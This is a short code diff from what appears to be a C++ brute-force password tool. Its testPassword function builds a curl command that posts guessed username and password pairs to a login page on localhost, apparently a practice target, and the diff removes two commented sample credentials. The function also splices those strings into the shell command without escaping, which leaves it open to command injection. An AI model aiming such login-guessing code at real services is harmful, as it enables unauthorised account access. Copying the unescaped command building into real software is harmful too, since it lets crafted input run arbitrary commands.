@@ -84,10 +84,8 @@ void BruteForce::launchBruteForceAttack_noWrite(const std::string &passChars, in
 void BruteForce::testPassword(std::string user, std::string password) {
 	std::string result;
 	std::string s1 = "curl -w \"HTTP Status:%{http_code}\" -d \"";
-	std::string s2 = "username=";
-	//user3  
+	std::string s2 = "username="; 
 	std::string s3 = "&password=";
-	//password1
 	std::string s4 = "&submit=Login\" http://localhost/Login-Test/login.php -v";
 
 	std::string command = s1 + s2 + user + s3 + password + s4;
